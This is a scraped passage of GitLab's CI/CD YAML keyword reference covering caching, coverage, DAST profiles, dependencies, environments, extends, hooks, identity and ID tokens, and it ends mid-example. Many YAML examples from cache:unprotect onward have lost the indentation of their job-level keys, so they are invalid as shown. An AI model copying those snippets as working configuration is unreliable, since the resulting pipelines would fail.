For more information about caches, see [Caching in GitLab CI/CD](https://docs.gitlab.com/ci/caching/).

#### `cache:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachepaths "Permalink")

Use the `cache:paths` keyword to choose which files or directories to cache.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of paths relative to the project directory ( `$CI_PROJECT_DIR`).
You can use wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) and
[`doublestar.Glob`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#Match) patterns.

[CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file) are supported.

**Example of `cache:paths`**:

Cache all files in `binaries` that end in `.apk` and the `.config` file:

YAML Copy to clipboard

```yaml
rspec:
  script:
    - echo "This job uses a cache."
  cache:
    key: binaries-cache
    paths:
      - binaries/*.apk
      - .config
```

**Additional details**:

- The `cache:paths` keyword includes files even if they are untracked or in your `.gitignore` file.

**Related topics**:

- See the [common `cache` use cases](https://docs.gitlab.com/ci/caching/#common-use-cases-for-caches) for more
`cache:paths` examples.

#### `cache:key` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekey "Permalink")

Use the `cache:key` keyword to give each cache a unique identifying key. All jobs
that use the same cache key use the same cache, including in different pipelines.

If not set, the default key is `default`. All jobs with the `cache` keyword but
no `cache:key` share the `default` cache.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.
- A predefined [CI/CD variable](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Example of `cache:key`**:

YAML Copy to clipboard

```yaml
cache-job:
  script:
    - echo "This job uses a cache."
  cache:
    key: binaries-cache-$CI_COMMIT_REF_SLUG
    paths:
      - binaries/
```

**Additional details**:

- If you use **Windows Batch** to run your shell scripts you must replace
`$` with `%`. For example: `key: %CI_COMMIT_REF_SLUG%`

- The `cache:key` value can’t contain:

  - The `/` character, or the equivalent URI-encoded `%2F`.
  - Only the `.` character (any number), or the equivalent URI-encoded `%2E`.
- The cache is shared between jobs, so if you’re using different
paths for different jobs, you should also set a different `cache:key`.
Otherwise cache content can be overwritten.


**Related topics**:

- You can specify a [fallback cache key](https://docs.gitlab.com/ci/caching/#use-a-fallback-cache-key)
to use if the specified `cache:key` is not found.
- You can [use multiple cache keys](https://docs.gitlab.com/ci/caching/#use-multiple-caches) in a single job.
- See the [common `cache` use cases](https://docs.gitlab.com/ci/caching/#common-use-cases-for-caches) for more
`cache:key` examples.

##### `cache:key:files` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekeyfiles "Permalink")

Use the `cache:key:files` keyword to generate a new key when files matching either of the defined paths or patterns
change. `cache:key:files` lets you reuse some caches, and rebuild them less often,
which speeds up subsequent pipeline runs.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of up to two file paths or patterns.

CI/CD variables are not supported.

**Example of `cache:key:files`**:

YAML Copy to clipboard

```yaml
cache-job:
  script:
    - echo "This job uses a cache."
  cache:
    key:
      files:
        - Gemfile.lock
        - package.json
    paths:
      - vendor/ruby
      - node_modules
```

This example creates a cache for Ruby and Node.js dependencies. The cache
is tied to the current versions of the `Gemfile.lock` and `package.json` files. When one of
these files changes, a new cache key is computed and a new cache is created. Any future
job runs that use the same `Gemfile.lock` and `package.json` with `cache:key:files`
use the new cache, instead of rebuilding the dependencies.

**Additional details**:

- The cache `key` is a SHA computed from the most recent commits
that changed each listed file.
If neither file is changed in any commits, the fallback key is `default`.
- Wildcard patterns like `**/package.json` can be used. An [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/301161)
exists to increase the number of paths or patterns allowed for a cache key.

##### `cache:key:prefix` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekeyprefix "Permalink")

Use `cache:key:prefix` to combine a prefix with the SHA computed for [`cache:key:files`](https://docs.gitlab.com/ci/yaml/#cachekeyfiles).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.
- A predefined [CI/CD variable](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Example of `cache:key:prefix`**:

YAML Copy to clipboard

```yaml
rspec:
  script:
    - echo "This rspec job uses a cache."
  cache:
    key:
      files:
        - Gemfile.lock
      prefix: $CI_JOB_NAME
    paths:
      - vendor/ruby
```

For example, adding a `prefix` of `$CI_JOB_NAME` causes the key to look like `rspec-feef9576d21ee9b6a32e30c5c79d0a0ceb68d1e5`.
If a branch changes `Gemfile.lock`, that branch has a new SHA checksum for `cache:key:files`.
A new cache key is generated, and a new cache is created for that key. If `Gemfile.lock`
is not found, the prefix is added to `default`, so the key in the example would be `rspec-default`.

**Additional details**:

- If no file in `cache:key:files` is changed in any commits, the prefix is added to the `default` key.

#### `cache:untracked` [Permalink](https://docs.gitlab.com/ci/yaml/\#cacheuntracked "Permalink")

Use `untracked: true` to cache all files that are untracked in your Git repository.
Untracked files include files that are:

- Ignored due to [`.gitignore` configuration](https://git-scm.com/docs/gitignore).
- Created, but not added to the checkout with [`git add`](https://git-scm.com/docs/git-add).

Caching untracked files can create unexpectedly large caches if the job downloads:

- Dependencies, like gems or node modules, which are usually untracked.
- [Artifacts](https://docs.gitlab.com/ci/yaml/#artifacts) from a different job. Files extracted from the artifacts are untracked by default.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `cache:untracked`**:

YAML Copy to clipboard

```yaml
rspec:
  script: test
  cache:
    untracked: true
```

**Additional details**:

- You can combine `cache:untracked` with `cache:paths` to cache all untracked files, as well as files in the configured paths.
Use `cache:paths` to cache any specific files, including tracked files, or files that are outside of the working directory,
and use `cache: untracked` to also cache all untracked files. For example:



YAML Copy to clipboard





```yaml
rspec:
    script: test
    cache:
      untracked: true
      paths:
      - binaries/
```

In this example, the job caches all untracked files in the repository, as well as all the files in `binaries/`.
If there are untracked files in `binaries/`, they are covered by both keywords.

#### `cache:unprotect` [Permalink](https://docs.gitlab.com/ci/yaml/\#cacheunprotect "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362114) in GitLab 15.8.

Use `cache:unprotect` to set a cache to be shared between [protected](https://docs.gitlab.com/user/project/repository/branches/protected/)
and unprotected branches.

When set to `true`, users without access to protected branches can read and write to
cache keys used by protected branches.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `cache:unprotect`**:

YAML Copy to clipboard

```yaml
rspec:
script: test
cache:
    unprotect: true
```

#### `cache:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachewhen "Permalink")

Use `cache:when` to define when to save the cache, based on the status of the job.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `on_success` (default): Save the cache only when the job succeeds.
- `on_failure`: Save the cache only when the job fails.
- `always`: Always save the cache.

**Example of `cache:when`**:

YAML Copy to clipboard

```yaml
rspec:
script: rspec
cache:
    paths:
      - rspec/
    when: 'always'
```

This example stores the cache whether or not the job fails or succeeds.

#### `cache:policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachepolicy "Permalink")

To change the upload and download behavior of a cache, use the `cache:policy` keyword.
By default, the job downloads the cache when the job starts, and uploads changes
to the cache when the job ends. This caching style is the `pull-push` policy (default).

To set a job to only download the cache when the job starts, but never upload changes
when the job finishes, use `cache:policy:pull`.

To set a job to only upload a cache when the job finishes, but never download the
cache when the job starts, use `cache:policy:push`.

Use the `pull` policy when you have many jobs executing in parallel that use the same cache.
This policy speeds up job execution and reduces load on the cache server. You can
use a job with the `push` policy to build the cache.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `pull`
- `push`
- `pull-push` (default)
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `cache:policy`**:

YAML Copy to clipboard

```yaml
prepare-dependencies-job:
stage: build
cache:
    key: gems
    paths:
      - vendor/bundle
    policy: push
script:
    - echo "This job only downloads dependencies and builds the cache."
    - echo "Downloading dependencies..."

faster-test-job:
stage: test
cache:
    key: gems
    paths:
      - vendor/bundle
    policy: pull
script:
    - echo "This job script uses the cache, but does not update it."
    - echo "Running tests..."
```

**Related topics**:

- You can [use a variable to control a job’s cache policy](https://docs.gitlab.com/ci/caching/#use-a-variable-to-control-a-jobs-cache-policy).

#### `cache:fallback_keys` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachefallback_keys "Permalink")

Use `cache:fallback_keys` to specify a list of keys to try to restore cache from
if there is no cache found for the `cache:key`. Caches are retrieved in the order specified
in the `fallback_keys` section.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of cache keys

**Example of `cache:fallback_keys`**:

YAML Copy to clipboard

```yaml
rspec:
script: rspec
cache:
    key: gems-$CI_COMMIT_REF_SLUG
    paths:
      - rspec/
    fallback_keys:
      - gems
    when: 'always'
```

### `coverage` [Permalink](https://docs.gitlab.com/ci/yaml/\#coverage "Permalink")

Use `coverage` with a custom regular expression to configure how code coverage
is extracted from the job output. The coverage is shown in the UI if at least one
line in the job output matches the regular expression.

To extract the code coverage value from the match, GitLab uses
this smaller regular expression: `\d+(?:\.\d+)?`.

**Supported values**:

- An RE2 regular expression. Must start and end with `/`. Must match the coverage number.
May match surrounding text as well, so you don’t need to use a regular expression character group
to capture the exact number.
Because it uses RE2 syntax, all groups must be non-capturing.

**Example of `coverage`**:

YAML Copy to clipboard

```yaml
job1:
script: rspec
coverage: '/Code coverage: \d+(?:\.\d+)?/'
```

In this example:

1. GitLab checks the job log for a match with the regular expression. A line
like `Code coverage: 67.89% of lines covered` would match.
2. GitLab then checks the matched fragment to find a match to the regular expression: `\d+(?:\.\d+)?`.
The sample regex can match a code coverage of `67.89`.

**Additional details**:

- You can find regex examples in [Code Coverage](https://docs.gitlab.com/ci/testing/code_coverage/#coverage-regex-patterns).
- If there is more than one matched line in the job output, the last line is used
(the first result of reverse search).
- If there are multiple matches in a single line, the last match is searched
for the coverage number.
- If there are multiple coverage numbers found in the matched fragment, the first number is used.
- Leading zeros are removed.
- Coverage output from [child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines)
is not recorded or displayed. Check [the related issue](https://gitlab.com/gitlab-org/gitlab/-/issues/280818)
for more details.

### `dast_configuration` [Permalink](https://docs.gitlab.com/ci/yaml/\#dast_configuration "Permalink")

- Tier: Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use the `dast_configuration` keyword to specify a site profile and scanner profile to be used in a
CI/CD configuration. Both profiles must first have been created in the project. The job’s stage must
be `dast`.

**Keyword type**: Job keyword. You can use only as part of a job.

**Supported values**: One each of `site_profile` and `scanner_profile`.

- Use `site_profile` to specify the site profile to be used in the job.
- Use `scanner_profile` to specify the scanner profile to be used in the job.

**Example of `dast_configuration`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - dast

include:
  - template: DAST.gitlab-ci.yml

dast:
dast_configuration:
    site_profile: "Example Co"
    scanner_profile: "Quick Passive Test"
```

In this example, the `dast` job extends the `dast` configuration added with the `include` keyword
to select a specific site profile and scanner profile.

**Additional details**:

- Settings contained in either a site profile or scanner profile take precedence over those
contained in the DAST template.

**Related topics**:

- [Site profile](https://docs.gitlab.com/user/application_security/dast/profiles/#site-profile).
- [Scanner profile](https://docs.gitlab.com/user/application_security/dast/profiles/#scanner-profile).

### `dependencies` [Permalink](https://docs.gitlab.com/ci/yaml/\#dependencies "Permalink")

Use the `dependencies` keyword to define a list of specific jobs to fetch [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts)
from. The specified jobs must all be in earlier stages. You can also set a job to download no artifacts at all.

When `dependencies` is not defined in a job, all jobs in earlier stages are considered dependent
and the job fetches all artifacts from those jobs.

To fetch artifacts from a job in the same stage, you must use [`needs:artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts).
You should not combine `dependencies` with `needs` in the same job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The names of jobs to fetch artifacts from.
- An empty array ( `[]`), to configure the job to not download any artifacts.

**Example of `dependencies`**:

YAML Copy to clipboard

```yaml
build osx:
stage: build
script: make build:osx
artifacts:
    paths:
      - binaries/

build linux:
stage: build
script: make build:linux
artifacts:
    paths:
      - binaries/

test osx:
stage: test
script: make test:osx
dependencies:
    - build osx

test linux:
stage: test
script: make test:linux
dependencies:
    - build linux

deploy:
stage: deploy
script: make deploy
environment: production
```

In this example, two jobs have artifacts: `build osx` and `build linux`. When `test osx` is executed,
the artifacts from `build osx` are downloaded and extracted in the context of the build.
The same thing happens for `test linux` and artifacts from `build linux`.

The `deploy` job downloads artifacts from all previous jobs because of
the [stage](https://docs.gitlab.com/ci/yaml/#stages) precedence.

**Additional details**:

- The job status does not matter. If a job fails or it’s a manual job that isn’t triggered, no error occurs.
- If the artifacts of a dependent job are [expired](https://docs.gitlab.com/ci/yaml/#artifactsexpire_in) or
[deleted](https://docs.gitlab.com/ci/jobs/job_artifacts/#delete-job-log-and-artifacts), then the job fails.

### `environment` [Permalink](https://docs.gitlab.com/ci/yaml/\#environment "Permalink")

Use `environment` to define the [environment](https://docs.gitlab.com/ci/environments/) that a job deploys to.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The name of the environment the job deploys to, in one of these
formats:

- Plain text, including letters, digits, spaces, and these characters: `-`, `_`, `/`, `$`, `{`, `}`.
- CI/CD variables, including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment: production
```

**Additional details**:

- If you specify an `environment` and no environment with that name exists, an environment is
created.

#### `environment:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentname "Permalink")

Set a name for an [environment](https://docs.gitlab.com/ci/environments/).

Common environment names are `qa`, `staging`, and `production`, but you can use any name.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The name of the environment the job deploys to, in one of these
formats:

- Plain text, including letters, digits, spaces, and these characters: `-`, `_`, `/`, `$`, `{`, `}`.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file),
including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment:name`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment:
    name: production
```

#### `environment:url` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmenturl "Permalink")

Set a URL for an [environment](https://docs.gitlab.com/ci/environments/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A single URL, in one of these formats:

- Plain text, like `https://prod.example.com`.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file),
including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment:url`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment:
    name: production
    url: https://prod.example.com
```

**Additional details**:

- After the job completes, you can access the URL by selecting a button in the merge request,
environment, or deployment pages.

#### `environment:on_stop` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmenton_stop "Permalink")

Closing (stopping) environments can be achieved with the `on_stop` keyword
defined under `environment`. It declares a different job that runs to close the
environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Additional details**:

- See [`environment:action`](https://docs.gitlab.com/ci/yaml/#environmentaction) for more details and an example.

#### `environment:action` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentaction "Permalink")

Use the `action` keyword to specify how the job interacts with the environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: One of the following keywords:

| **Value** | **Description** |
| --- | --- |
| `start` | Default value. Indicates that the job starts the environment. The deployment is created after the job starts. |
| `prepare` | Indicates that the job is only preparing the environment. It does not trigger deployments. [Read more about preparing environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |
| `stop` | Indicates that the job stops an environment. [Read more about stopping an environment](https://docs.gitlab.com/ci/environments/#stopping-an-environment). |
| `verify` | Indicates that the job is only verifying the environment. It does not trigger deployments. [Read more about verifying environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |
| `access` | Indicates that the job is only accessing the environment. It does not trigger deployments. [Read more about accessing environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |

|
|

**Example of `environment:action`**:

YAML Copy to clipboard

```yaml
stop_review_app:
stage: deploy
variables:
    GIT_STRATEGY: none
script: make delete-app
when: manual
environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
```

#### `environment:auto_stop_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentauto_stop_in "Permalink")

History

- CI/CD variable support [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/365140) in GitLab 15.4.
- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/437133) to support `prepare`, `access` and `verify` environment actions in GitLab 17.7.

The `auto_stop_in` keyword specifies the lifetime of the environment. When an environment expires, GitLab
automatically stops it.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A period of time written in natural language. For example,
these are all equivalent:

- `168 hours`
- `7 days`
- `one week`
- `never`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `environment:auto_stop_in`**:

YAML Copy to clipboard

```yaml
review_app:
script: deploy-review-app
environment:
    name: review/$CI_COMMIT_REF_SLUG
    auto_stop_in: 1 day
```

When the environment for `review_app` is created, the environment’s lifetime is set to `1 day`.
Every time the review app is deployed, that lifetime is also reset to `1 day`.

The `auto_stop_in` keyword can be used for all [environment actions](https://docs.gitlab.com/ci/yaml/#environmentaction) except `stop`.
Some actions can be used to reset the scheduled stop time for the environment. For more information, see
[Access an environment for preparation or verification purposes](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes).

**Related topics**:

- [Environments auto-stop documentation](https://docs.gitlab.com/ci/environments/#stop-an-environment-after-a-certain-time-period).

#### `environment:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentkubernetes "Permalink")

History

- `agent` keyword [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/467912) in GitLab 17.6.
- `namespace` and `flux_resource_path` keywords [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/500164) in GitLab 17.7.

Use the `kubernetes` keyword to configure the [dashboard for Kubernetes](https://docs.gitlab.com/ci/environments/kubernetes_dashboard/)
for an environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `agent`: A string specifying the [GitLab agent for Kubernetes](https://docs.gitlab.com/user/clusters/agent/). The format is `path/to/agent/project:agent-name`. If the agent is connected to the project running the pipeline, use `$CI_PROJECT_PATH:agent-name`.
- `namespace`: A string representing the Kubernetes namespace where the environment is deployed. The namespace must be set together with the `agent` keyword.
- `flux_resource_path`: A string representing the full path to the Flux resource, such as a HelmRelease. The Flux resource must be set together with the
`agent` and `namespace` keywords.

**Example of `environment:kubernetes`**:

YAML Copy to clipboard

```yaml
deploy:
stage: deploy
script: make deploy-app
environment:
    name: production
    kubernetes:
      agent: path/to/agent/project:agent-name
      namespace: my-namespace
      flux_resource_path: helm.toolkit.fluxcd.io/v2/namespaces/flux-system/helmreleases/helm-release-resource
```

This configuration:

- Sets up the `deploy` job to deploy to the `production`
environment
- Associates the [agent](https://docs.gitlab.com/user/clusters/agent/) named `agent-name` with the environment
- Configures the [dashboard for Kubernetes](https://docs.gitlab.com/ci/environments/kubernetes_dashboard/) for an environment with
the namespace `my-namespace` and the `flux_resource_path` set to
`helm.toolkit.fluxcd.io/v2/namespaces/flux-system/helmreleases/helm-release-resource`.

**Additional details**:

- To use the dashboard, you must
[install the GitLab agent for Kubernetes](https://docs.gitlab.com/user/clusters/agent/install/) and
[configure `user_access`](https://docs.gitlab.com/user/clusters/agent/user_access/)
for the environment’s project or its parent group.
- The user running the job must be authorized to access the cluster agent.
Otherwise, the dashboard ignores the `agent`, `namespace`, and `flux_resource_path` attributes.
- If you only want to set the `agent`, you do not have to set the `namespace`, and cannot set `flux_resource_path`. However, this configuration lists all namespaces in a cluster in the dashboard for Kubernetes.

#### `environment:deployment_tier` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentdeployment_tier "Permalink")

Use the `deployment_tier` keyword to specify the tier of the deployment environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: One of the following:

- `production`
- `staging`
- `testing`
- `development`
- `other`

**Example of `environment:deployment_tier`**:

YAML Copy to clipboard

```yaml
deploy:
script: echo
environment:
    name: customer-portal
    deployment_tier: production
```

**Additional details**:

- Environments created from this job definition are assigned a [tier](https://docs.gitlab.com/ci/environments/#deployment-tier-of-environments) based on this value.
- Existing environments don’t have their tier updated if this value is added later. Existing environments must have their tier updated via the [Environments API](https://docs.gitlab.com/api/environments/#update-an-existing-environment).

**Related topics**:

- [Deployment tier of environments](https://docs.gitlab.com/ci/environments/#deployment-tier-of-environments).

#### Dynamic environments [Permalink](https://docs.gitlab.com/ci/yaml/\#dynamic-environments "Permalink")

Use CI/CD [variables](https://docs.gitlab.com/ci/variables/) to dynamically name environments.

For example:

YAML Copy to clipboard

```yaml
deploy as review app:
stage: deploy
script: make deploy
environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com/
```

The `deploy as review app` job is marked as a deployment to dynamically
create the `review/$CI_COMMIT_REF_SLUG` environment. `$CI_COMMIT_REF_SLUG`
is a [CI/CD variable](https://docs.gitlab.com/ci/variables/) set by the runner. The
`$CI_ENVIRONMENT_SLUG` variable is based on the environment name, but suitable
for inclusion in URLs. If the `deploy as review app` job runs in a branch named
`pow`, this environment would be accessible with a URL like `https://review-pow.example.com/`.

The common use case is to create dynamic environments for branches and use them
as review apps. You can see an example that uses review apps at
[https://gitlab.com/gitlab-examples/review-apps-nginx/](https://gitlab.com/gitlab-examples/review-apps-nginx/).

### `extends` [Permalink](https://docs.gitlab.com/ci/yaml/\#extends "Permalink")

Use `extends` to reuse configuration sections. It’s an alternative to [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#anchors)
and is a little more flexible and readable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The name of another job in the pipeline.
- A list (array) of names of other jobs in the pipeline.

**Example of `extends`**:

YAML Copy to clipboard

```yaml
.tests:
stage: test
image: ruby:3.0

rspec:
extends: .tests
script: rake rspec

rubocop:
extends: .tests
script: bundle exec rubocop
```

In this example, the `rspec` job uses the configuration from the `.tests` template job.
When creating the pipeline, GitLab:

- Performs a reverse deep merge based on the keys.
- Merges the `.tests` content with the `rspec` job.
- Doesn’t merge the values of the keys.

The combined configuration is equivalent to these jobs:

YAML Copy to clipboard

```yaml
rspec:
stage: test
image: ruby:3.0
script: rake rspec

rubocop:
stage: test
image: ruby:3.0
script: bundle exec rubocop
```

**Additional details**:

- You can use multiple parents for `extends`.
- The `extends` keyword supports up to eleven levels of inheritance, but you should
avoid using more than three levels.
- In the previous example, `.tests` is a [hidden job](https://docs.gitlab.com/ci/jobs/#hide-a-job),
but you can extend configuration from regular jobs as well.

**Related topics**:

- [Reuse configuration sections by using `extends`](https://docs.gitlab.com/ci/yaml/yaml_optimization/#use-extends-to-reuse-configuration-sections).
- Use `extends` to reuse configuration from [included configuration files](https://docs.gitlab.com/ci/yaml/yaml_optimization/#use-extends-and-include-together).

### `hooks` [Permalink](https://docs.gitlab.com/ci/yaml/\#hooks "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356850) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hooks_pre_get_sources_script`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/381840) in GitLab 15.10. Feature flag `ci_hooks_pre_get_sources_script` removed.

Use `hooks` to specify lists of commands to execute on the runner
at certain stages of job execution, like before retrieving the Git repository.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A hash of hooks and their commands. Available hooks: `pre_get_sources_script`.

#### `hooks:pre_get_sources_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#hookspre_get_sources_script "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356850) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hooks_pre_get_sources_script`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/381840) in GitLab 15.10. Feature flag `ci_hooks_pre_get_sources_script` removed.

Use `hooks:pre_get_sources_script` to specify a list of commands to execute on the runner
before cloning the Git repository and any submodules.
You can use it for example to:

- Adjust the [Git configuration](https://docs.gitlab.com/ci/jobs/job_troubleshooting/#get_sources-job-section-fails-because-of-an-http2-problem).
- Export [tracing variables](https://docs.gitlab.com/topics/git/troubleshooting_git/#debug-git-with-traces).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `hooks:pre_get_sources_script`**:

YAML Copy to clipboard

```yaml
job1:
hooks:
    pre_get_sources_script:
      - echo 'hello job1 pre_get_sources_script'
script: echo 'hello job1 script'
```

**Related topics**:

- [GitLab Runner configuration](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-runners-section)

### `identity` [Permalink](https://docs.gitlab.com/ci/yaml/\#identity "Permalink")

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com
- Status: Beta

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142054) in GitLab 16.9 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `google_cloud_support_feature_flag`. This feature is in [beta](https://docs.gitlab.com/policy/development_stages_support/).
- [Enabled on GitLab.com](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/150472) in GitLab 17.1. Feature flag `google_cloud_support_feature_flag` removed.

This feature is in [beta](https://docs.gitlab.com/policy/development_stages_support/).

Use `identity` to authenticate with third party services using identity federation.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default:` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An identifier. Supported providers:

- `google_cloud`: Google Cloud. Must be configured with the [Google Cloud IAM integration](https://docs.gitlab.com/integration/google_cloud_iam/).

**Example of `identity`**:

YAML Copy to clipboard

```yaml
job_with_workload_identity:
identity: google_cloud
script:
    - gcloud compute instances list
```

**Related topics**:

- [Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation).
- [Google Cloud IAM integration](https://docs.gitlab.com/integration/google_cloud_iam/).

### `id_tokens` [Permalink](https://docs.gitlab.com/ci/yaml/\#id_tokens "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356986) in GitLab 15.7.

Use `id_tokens` to create [JSON web tokens (JWT)](https://www.rfc-editor.org/rfc/rfc7519) to authenticate with third party services. All
JWTs created this way support OIDC authentication. The required `aud` sub-keyword is used to configure the `aud` claim for the JWT.

**Supported values**:

- Token names with their `aud` claims. `aud` supports:
  - A single string.
  - An array of strings.
  - [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `id_tokens`**:

YAML Copy to clipboard

```yaml
job_with_id_tokens:
id_tokens:
    ID_TOKEN_1:
      aud: https://vault.example.com
    ID_TOKEN_2:
      aud:
        - https://gcp.com
        - https://aws.com
    SIGSTORE_ID_TOKEN:
      aud: sigstore
script:
    - command_to_authenticate_with_vault $ID_TOKEN_1
    - command_to_authenticate_with_aws $ID_TOKEN_2
    - command_to_authenticate_with_gcp $ID_TOKEN_2
```

**Related topics**:

- [ID token authentication](https://docs.gitlab.com/ci/secrets/id_token_authentication/).
- [Connect to cloud services](https://docs.gitlab.com/ci/cloud_services/).
- [Keyless signing with Sigstore](https://docs.gitlab.com/ci/yaml/signing_examples/).

### `image` [Permalink](https://docs.gitlab.com/ci/yaml/\#image "Permalink")

Use `image` to specify a Docker image that the job runs in.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `image`**:

YAML Copy to clipboard

```yaml
default:
